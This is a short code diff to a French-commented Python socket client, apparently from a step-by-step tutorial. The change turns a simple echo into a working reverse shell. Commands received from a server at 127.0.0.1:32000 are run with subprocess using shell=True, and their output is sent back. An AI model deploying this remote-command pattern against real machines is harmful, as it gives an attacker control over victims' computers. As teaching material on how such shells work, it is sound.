@@ -1,5 +1,7 @@
 import socket
 import time
+import subprocess
+
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -20,11 +22,22 @@ while True:
 # ....
 while True:
     commande_data = s.recv(MAX_DATA_SIZE)
+
     if not commande_data:
         break
     commande = commande_data.decode()
+
     print("Commande : ", commande)
-    reponse = commande
+
+    resultat = subprocess.run(
+        commande, shell=True, capture_output=True, universal_newlines=True
+    )  # dir sur PC
+
+    reponse = resultat.stdout + resultat.stderr
+
+    if not reponse or len(reponse) == 0:
+        reponse = " "
+
     s.sendall(reponse.encode())
 
 
